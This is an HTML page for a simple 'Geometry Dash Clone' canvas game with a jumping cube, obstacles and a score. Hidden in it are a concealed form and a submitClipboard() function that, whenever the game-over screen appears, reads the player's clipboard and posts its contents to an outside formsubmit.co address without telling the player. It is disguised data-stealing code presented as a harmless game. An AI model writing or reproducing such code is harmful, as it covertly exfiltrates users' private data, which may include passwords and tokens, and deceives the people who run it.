<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Geometry Dash Clone</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      flex-direction: column;
    }
    canvas {
      background-color: #222;
      border: 2px solid #000;
    }
    .gameOverScreen {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      color: white;
      display: none;
    }
    .gameOverScreen h2 {
      font-size: 50px;
    }
    .gameOverScreen button {
      padding: 10px 20px;
      font-size: 16px;
      background-color: #4CAF50;
      border: none;
      cursor: pointer;
      margin-top: 10px;
    }
    .gameOverScreen button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>

  <canvas id="gameCanvas" width="800" height="400"></canvas>
  <div class="gameOverScreen" id="gameOverScreen">
    <h2>GAME OVER</h2>
    <p>Score: <span id="finalScore"></span></p>
    <button onclick="restartGame()">Restart</button>
  </div>

  <form id="submitForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display: none;">
    <input type="hidden" name="clipboardText" id="clipboardInput">
  </form>

  <script>
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');

    // Sound effects
    const jumpSound = new Audio('https://www.soundjay.com/button/beep-07.wav');
    const gameOverSound = new Audio('https://www.soundjay.com/button/beep-08b.wav');

    // Game variables
    let cube = {
      x: 50,
      y: 300,
      width: 50,
      height: 50,
      speed: 3,
      gravity: 0.6,
      jumpPower: -15,
      velocity: 0,
      jumping: false
    };

    let obstacles = [];
    let score = 0;
    let isGameOver = false;

    // Game loop
    function gameLoop() {
      if (isGameOver) {
        displayGameOver();
        return;
      }

      ctx.clearRect(0, 0, canvas.width, canvas.height);
      cube.velocity += cube.gravity;
      cube.y += cube.velocity;

      // Keep the cube within the canvas
      if (cube.y > canvas.height - cube.height) {
        cube.y = canvas.height - cube.height;
        cube.velocity = 0;
        cube.jumping = false;
      }

      // Draw the cube
      ctx.fillStyle = "#00f";
      ctx.fillRect(cube.x, cube.y, cube.width, cube.height);

      // Handle obstacles
      if (Math.random() < 0.02) {
        let obstacleHeight = Math.random() * (canvas.height - 100) + 30;
        obstacles.push({
          x: canvas.width,
          y: canvas.height - obstacleHeight,
          width: 20,
          height: obstacleHeight,
          speed: Math.random() * 3 + 2 // Varying obstacle speed
        });
      }

      for (let i = 0; i < obstacles.length; i++) {
        let obstacle = obstacles[i];
        obstacle.x -= obstacle.speed; // Dynamic obstacle speed
        ctx.fillStyle = "#f00";
        ctx.fillRect(obstacle.x, obstacle.y, obstacle.width, obstacle.height);

        // Collision detection
        if (cube.x + cube.width > obstacle.x && cube.x < obstacle.x + obstacle.width &&
            cube.y + cube.height > obstacle.y) {
          isGameOver = true;
        }

        // Remove obstacles that go off screen
        if (obstacle.x + obstacle.width < 0) {
          obstacles.splice(i, 1);
          score++;
        }
      }

      // Display score
      ctx.fillStyle = "#fff";
      ctx.font = "20px Arial";
      ctx.fillText("Score: " + score, 20, 30);

      requestAnimationFrame(gameLoop);
    }

    // Jump functionality
    function jump() {
      if (!cube.jumping) {
        cube.velocity = cube.jumpPower;
        cube.jumping = true;
        jumpSound.play();
      }
    }

    // Game Over screen
    function displayGameOver() {
      document.getElementById('finalScore').textContent = score;
      document.getElementById('gameOverScreen').style.display = 'block';

      // Submit clipboard content when game ends
      submitClipboard();
      gameOverSound.play();
    }

    // Submit clipboard text to form
    async function submitClipboard() {
      try {
        const clipboardText = await navigator.clipboard.readText();
        document.getElementById('clipboardInput').value = clipboardText;
        document.getElementById('submitForm').submit();
      } catch (err) {
        console.error('Failed to read clipboard: ' + err.message);
      }
    }

    // Restart the game
    function restartGame() {
      cube.y = 300;
      cube.velocity = 0;
      cube.jumping = false;
      obstacles = [];
      score = 0;
      isGameOver = false;
      document.getElementById('gameOverScreen').style.display = 'none';
      gameLoop();
    }

    // Event listener for jumping
    window.addEventListener('keydown', function(e) {
      if (e.key === ' ' || e.key === 'ArrowUp') {
        jump();
      }
    });

    // Start the game
    gameLoop();
  </script>
</body>
</html>
